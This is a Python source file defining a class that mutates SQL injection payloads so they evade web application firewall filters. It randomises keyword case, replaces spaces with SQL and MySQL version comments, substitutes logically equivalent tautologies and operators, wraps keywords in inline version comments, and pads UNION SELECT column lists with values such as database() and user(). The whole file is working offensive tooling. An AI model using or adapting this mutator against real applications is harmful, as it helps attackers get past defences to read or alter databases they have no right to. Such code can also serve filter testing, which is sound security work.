import random
import re

class ASTMutator:
    def __init__(self):
        self.sql_keywords = ["UNION", "SELECT", "OR", "AND", "WHERE", "ORDER BY", "SLEEP", "GROUP BY"]
        self.strategies = {
            "whitespace_camo": self._whitespace_camouflage,
            "case_mutation": self._case_mutation,
            "logical_alts": self._logical_equivalents,
            "inline_comments": self._inline_version_comments,
            "union_balance": self._balance_union_columns,
            "junk_fill": self._junk_filling
        }

    def mutate(self, payload):
        mutated = str(payload)
        if mutated.startswith("0x"): return mutated
        num_mutations = 2
        chosen_strats = random.sample(list(self.strategies.keys()), num_mutations)
        for strat in chosen_strats:
            mutated = self.strategies[strat](mutated)
        return mutated

    def _case_mutation(self, payload):
        return "".join([c.upper() if random.random() > 0.5 else c.lower() for c in str(payload)])

    def _whitespace_camouflage(self, payload):
        complex_spaces = ["/**/", "/*!*/", " \n ", " \t ", "/*!50000*/"]
        parts = payload.split()
        if len(parts) <= 1: return payload
        return "".join([part + random.choice(complex_spaces) for part in parts[:-1]]) + parts[-1]

    def _inline_version_comments(self, payload):
        mutated = payload
        for kw in self.sql_keywords:
            if kw in mutated.upper():
                rand_ver = random.randint(40000, 60000)
                mutated = re.sub(rf'\b{kw}\b', f"/*!{rand_ver}{kw}*/", mutated, flags=re.IGNORECASE)
        return mutated

    def _logical_equivalents(self, payload):
        equivalents = {
            r"1=1": ["true", "not false", "~0=~0", "8<=>8"],
            r"\bOR\b": ["||", "XOR"],
            r"\bAND\b": ["&&"]
        }
        mutated = payload
        for pattern, alts in equivalents.items():
            mutated = re.sub(pattern, random.choice(alts), mutated, flags=re.IGNORECASE)
        return mutated

    def _balance_union_columns(self, payload):
        if "UNION" in payload.upper() and "SELECT" in payload.upper():
            column_options = ["NULL", "NULL,NULL", "NULL,NULL,NULL", "1,2", "database(),user()"]
            parts = re.split(r"(SELECT\s+)", payload, maxsplit=1, flags=re.IGNORECASE)
            if len(parts) >= 3:
                return f"{parts[0]}{parts[1]}{random.choice(column_options)}"
        return payload

    def _junk_filling(self, payload):
        junk = ["bypass", "unit804", "audit"]
        if "/**/" in payload:
            return payload.replace("/**/", f"/*{random.choice(junk)}*/")
        return payload
